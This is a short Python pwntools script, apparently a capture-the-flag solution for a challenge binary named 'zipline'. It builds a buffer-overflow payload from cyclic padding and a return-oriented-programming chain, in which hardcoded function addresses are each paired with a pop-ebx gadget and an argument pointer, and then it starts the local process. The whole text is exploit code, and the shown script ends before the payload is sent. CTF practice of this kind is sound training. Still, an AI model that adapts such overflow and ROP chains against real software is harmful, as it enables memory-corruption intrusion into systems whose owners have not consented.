from pwn import *

arg1 = p32(0x0804a02f) # watr
arg2 = p32(0x0804a04c) # land
arg3 = p32(0x0804a069) # undr
arg4 = p32(0x0804a086) # limb
arg5 = p32(0x0804a0a3) # hell
arg6 = p32(0x0804a0c0) # mine
arg7 = p32(0x0804a0dd) # brok
arg8 = p32(0x0804a008) # clod

water = 0x0804926d
land = 0x080492c4
underground = 0x0804931b
limbo = 0x08049372
hell = 0x080493c9
minecraft_nether = 0x08049420
bedrock = 0x08049477
air = 0x08049216

i_got_u = 0x080a0102
i_got_u_main = 0x08049569
ret_gadget = 0x0804900a

pop_ebx = 0x08049021
fake_ebp = cyclic(4)

args = [(air, arg8), (land, arg2), (underground, arg3), (limbo, arg4), (hell, arg5), (minecraft_nether, arg6), (bedrock, arg7), (water, arg1)]

payload = cyclic(22)

for each_arg in args:
    payload += p32(each_arg[0]) + p32(pop_ebx) + each_arg[1]

payload += p32(i_got_u_main)
p = process('./zipline')